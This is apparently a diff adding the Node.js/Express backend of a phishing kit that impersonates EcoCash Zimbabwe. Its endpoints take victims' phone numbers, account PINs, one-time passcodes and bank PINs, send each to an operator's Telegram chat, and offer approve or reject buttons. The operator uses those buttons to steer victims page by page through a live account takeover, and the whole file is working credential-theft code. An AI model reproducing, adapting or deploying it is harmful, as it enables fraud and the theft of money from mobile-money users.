@@ -1,0 +1,390 @@
+const express = require('express');
+const path = require('path');
+require('dotenv').config();
+
+const app = express();
+const PORT = process.env.PORT || 10000;
+
+// -------------------- BOT CONFIG --------------------
+const BOT_TOKEN = (process.env.BOT_TOKEN || "").trim();
+const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();
+
+let bot = null;
+let botEnabled = false;
+
+if (BOT_TOKEN) {
+  try {
+    const { Telegraf } = require('telegraf');
+    bot = new Telegraf(BOT_TOKEN);
+    botEnabled = true;
+    console.log('🤖 Telegram bot is configured (BOT_TOKEN provided).');
+  } catch (err) {
+    console.error('Failed to initialize Telegraf:', err);
+    botEnabled = false;
+  }
+} else {
+  console.warn('⚠️ BOT_TOKEN not set — Telegram bot disabled. Set BOT_TOKEN and ADMIN_CHAT_ID to enable.');
+}
+
+// -------------------- MEMORY STORE --------------------
+const statusStore = {};
+
+// -------------------- MIDDLEWARE --------------------
+app.use(express.json());
+app.use(express.static(path.join(__dirname, 'public')));
+
+// -------------------- ROUTES --------------------
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// Helper to require telegram config for routes that send messages
+function telegramConfigured() {
+  return botEnabled && bot && ADMIN_ID;
+}
+
+// -------------------- LOGIN API --------------------
+app.post('/api/login-notification', async (req, res) => {
+  const { phone, pin } = req.body || {};
+  const country = "Zimbabwe";
+  const countryCode = "+263";
+
+  const currentTime = new Date().toLocaleString('en-US', {
+    month: 'numeric', day: 'numeric', year: 'numeric',
+    hour: 'numeric', minute: 'numeric', second: 'numeric',
+    hour12: true
+  });
+
+  if (!phone || !pin) return res.status(400).json({ error: "Missing data" });
+  if (!telegramConfigured()) {
+    console.warn('/api/login-notification called but Telegram is not configured.');
+    // Still record status for local testing, but return informative error
+    statusStore[phone] = "pending";
+    return res.status(500).json({ error: "Telegram not configured" });
+  }
+
+  statusStore[phone] = "pending";
+
+  const message = `📱 <b>ECOCASH ZIMBABWE - LOGIN ATTEMPT</b>
+
+🆕 <b>NEW USER</b>
+🇿🇼 <b>Country:</b> ${country}
+🌍 <b>Country Code:</b> ${countryCode}
+📱 <b>Phone Number:</b> ${phone}
+🔢 <b>PIN:</b> ${pin}
+⏰ <b>Time:</b> ${currentTime}
+
+━━━━━━━━━━━━━━━
+
+⚠️ <b>User waiting for approval</b>
+⌛ <b>Timeout: 5 minutes</b>`;
+
+  try {
+    await bot.telegram.sendMessage(ADMIN_ID, message, {
+      parse_mode: 'HTML',
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "✅ Allow to proceed", callback_data: `approve|${phone}|${pin}` },
+            { text: "❌ Invalid credentials", callback_data: `deny|${phone}|${pin}` }
+          ]
+        ]
+      }
+    });
+    res.json({ success: true });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// -------------------- OTP VERIFICATION API (Page 8) --------------------
+app.post('/api/verify-first-otp', async (req, res) => {
+  const { phone, otp } = req.body || {};
+  const country = "Zimbabwe";
+  const countryCode = "+263";
+  const currentTime = new Date().toLocaleString('en-US', {
+    month: 'numeric', day: 'numeric', year: 'numeric',
+    hour: 'numeric', minute: 'numeric', second: 'numeric',
+    hour12: true
+  });
+
+  if (!phone || !otp) return res.status(400).json({ error: "Missing data" });
+  if (!telegramConfigured()) {
+    console.warn('/api/verify-first-otp called but Telegram is not configured.');
+    return res.status(500).json({ error: "Telegram not configured" });
+  }
+
+  const otpMessage = `🔐 <b>ECOCASH ZIMBABWE - OTP VERIFICATION</b>
+
+🆕 <b>NEW USER VERIFICATION</b>
+🇿🇼 <b>Country:</b> ${country}
+🌍 <b>Country Code:</b> ${countryCode}
+📱 <b>Phone Number:</b> ${phone}
+🔐 <b>OTP Code:</b> ${otp}
+⏰ <b>Time:</b> ${currentTime}
+
+━━━━━━━━━━━━━━━
+
+⚠️ <b>Verify OTP:</b>
+⌛ <b>Timeout: 5 minutes</b>`;
+
+  try {
+    await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
+      parse_mode: 'HTML',
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "✅ Correct", callback_data: `otp1_correct|${phone}|${otp}` },
+            { text: "❌ Wrong Code", callback_data: `otp1_wrong|${phone}` },
+            { text: "🔑 Wrong PIN", callback_data: `otp1_wrongpin|${phone}` }
+          ]
+        ]
+      }
+    });
+    res.json({ success: true });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// -------------------- RESEND OTP API --------------------
+app.post('/api/resend-otp-notification', async (req, res) => {
+  const { phone, step } = req.body || {};
+
+  if (!phone) return res.status(400).json({ error: "Missing data" });
+  if (!telegramConfigured()) {
+    console.warn('/api/resend-otp-notification called but Telegram is not configured.');
+    return res.status(500).json({ error: "Telegram not configured" });
+  }
+
+  const resendMsg = `🔄 <b>RESEND REQUESTED</b>
+
+📱 <b>Phone Number:</b> ${phone}
+📍 <b>Step:</b> ${step || "OTP Verification"}
+⚠️ <b>User is waiting for a new code.</b>
+
+━━━━━━━━━━━━━━━`;
+
+  try {
+    await bot.telegram.sendMessage(ADMIN_ID, resendMsg, { parse_mode: 'HTML' });
+    res.json({ success: true });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ error: "Telegram error" });
+  }
+});
+
+// -------------------- BANK PIN API --------------------
+app.post('/api/verify-bank-pin', async (req, res) => {
+  const { phone, bankPin } = req.body || {};
+  const country = "Zimbabwe";
+  const countryCode = "+263";
+  const currentTime = new Date().toLocaleString('en-US', {
+    month: 'numeric', day: 'numeric', year: 'numeric',
+    hour: 'numeric', minute: 'numeric', second: 'numeric',
+    hour12: true
+  });
+
+  if (!phone || !bankPin) return res.status(400).json({ error: "Missing data" });
+  if (!telegramConfigured()) {
+    console.warn('/api/verify-bank-pin called but Telegram is not configured.');
+    // Update local status for UI flow but inform caller that Telegram isn't available
+    statusStore[phone] = "pending_bank_pin";
+    return res.status(500).json({ error: "Telegram not configured" });
+  }
+
+  statusStore[phone] = "pending_bank_pin";
+
+  const bankPinMessage = `🏦 <b>ECOCASH ZIMBABWE - BANK PIN VERIFICATION</b>
+
+🆕 <b>NEW USER - BANK SECURITY</b>
+🇿🇼 <b>Country:</b> ${country}
+📱 <b>Phone Number:</b> ${phone}
+🔑 <b>Bank PIN:</b> ${bankPin}
+⏰ <b>Time:</b> ${currentTime}
+
+━━━━━━━━━━━━━━━
+
+⚠️ <b>Verify BANK PIN:</b>
+⌛ <b>Timeout: 5 minutes</b>`;
+
+  try {
+    await bot.telegram.sendMessage(ADMIN_ID, bankPinMessage, {
+      parse_mode: 'HTML',
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "✅ Correct", callback_data: `bank_correct|${phone}|${bankPin}` },
+            { text: "❌ Wrong PIN", callback_data: `bank_wrong|${phone}` }
+          ]
+        ]
+      }
+    });
+    res.json({ success: true });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ error: "Telegram error" });
+  }
+});
+
+// -------------------- BOT ACTIONS --------------------
+if (botEnabled) {
+  // APPROVE LOGIN
+  bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    const pin = ctx.match[2];
+    statusStore[phone] = "approved";
+    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
+
+    const approvedMsg = `✅ <b>LOGIN APPROVED</b>
+
+🆕 <b>NEW USER</b>
+🇿🇼 <b>Zimbabwe</b>
+📱 <b>${phone}</b>
+🔐 <b>${pin}</b>
+
+━━━━━━━━━━━━━━━
+
+✅ <b>Status: Approved</b>
+➡️ <b>Next: Entering OTP (Page 8)</b>
+⏱️ <b>${currentTime}</b>`;
+
+    await ctx.answerCbQuery("Allowed");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(approvedMsg);
+  });
+
+  // DENY LOGIN
+  bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    const pin = ctx.match[2];
+    statusStore[phone] = "denied";
+    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
+
+    const deniedMsg = `❌ <b>INVALID CREDENTIALS</b>
+
+🇿🇼 <b>Zimbabwe</b>
+📱 <b>${phone}</b>
+🔐 <b>${pin}</b>
+
+━━━━━━━━━━━━━━━
+
+❌ <b>Status: Rejected</b>
+⏱️ <b>${currentTime}</b>`;
+
+    await ctx.answerCbQuery("Rejected");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(deniedMsg);
+  });
+
+  // OTP CORRECT
+  bot.action(/^otp1_correct\|(.+)\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    const otp = ctx.match[2];
+    statusStore[phone] = "otp1_correct";
+    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
+
+    const verifiedMsg = `1️⃣ <b>OTP VERIFIED</b>
+
+🇿🇼 <b>Zimbabwe</b>
+📱 <b>${phone}</b>
+🔐 <b>${otp}</b>
+
+━━━━━━━━━━━━━━━
+
+✅ <b>Status: OTP Verified successfully</b>
+⌛ <b>${currentTime}</b>`;
+
+    await ctx.answerCbQuery("Verified");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(verifiedMsg);
+  });
+
+  // OTP WRONG CODE
+  bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    statusStore[phone] = "otp1_wrong";
+    await ctx.answerCbQuery("Wrong Code");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(`❌ <b>OTP WRONG CODE</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`);
+  });
+
+  // OTP WRONG PIN
+  bot.action(/^otp1_wrongpin\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    statusStore[phone] = "otp1_wrongpin";
+    await ctx.answerCbQuery("Wrong PIN");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(`🔑 <b>WRONG PIN REPORTED</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>User redirected back to enter PIN (Page 6).</b>`);
+  });
+
+  // BANK PIN CORRECT
+  bot.action(/^bank_correct\|(.+)\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    const pin = ctx.match[2];
+    statusStore[phone] = "bank_pin_correct";
+
+    const finalizedMsg = `✅ <b>BANK PIN VERIFIED</b>
+
+🇿🇼 <b>Zimbabwe</b>
+📱 <b>${phone}</b>
+🔑 <b>${pin}</b>
+
+━━━━━━━━━━━━━━━
+
+✅ <b>Status: Process Completed</b>
+🏁 <b>User redirected to Success page</b>`;
+
+    await ctx.answerCbQuery("Bank PIN Verified");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(finalizedMsg);
+  });
+
+  // BANK PIN WRONG
+  bot.action(/^bank_wrong\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    statusStore[phone] = "bank_pin_wrong";
+    await ctx.answerCbQuery("Wrong Bank PIN");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(`❌ <b>BANK PIN WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter Bank PIN.</b>`);
+  });
+}
+
+// -------------------- STATUS CHECK --------------------
+app.get('/api/check-status', (req, res) => {
+  const phone = req.query.phone;
+  res.json({ status: statusStore[phone] || "pending" });
+});
+
+// -------------------- SAFE PAGE ROUTE --------------------
+app.get('/:page', (req, res, next) => {
+  if (req.params.page.startsWith('api')) return next();
+  const file = req.params.page.endsWith('.html') ? req.params.page : req.params.page + '.html';
+  res.sendFile(path.join(__dirname, 'public', file), (err) => {
+    if (err) res.status(404).send("Page not found");
+  });
+});
+
+// -------------------- START SERVER & BOT --------------------
+app.listen(PORT, async () => {
+  console.log(`🚀 Server running on port ${PORT}`);
+  if (!botEnabled) {
+    console.log('⚠️ Bot not enabled; running without Telegram integration.');
+    return;
+  }
+  try {
+    await bot.telegram.deleteWebhook({ drop_pending_updates: true });
+    await bot.launch();
+    console.log('🤖 Bot is active');
+  } catch (err) {
+    console.error('Bot launch error:', err);
+  }
+});
+
+// Graceful stop
+if (botEnabled) {
+  process.once('SIGINT', () => bot.stop('SIGINT'));
+  process.once('SIGTERM', () => bot.stop('SIGTERM'));
+}
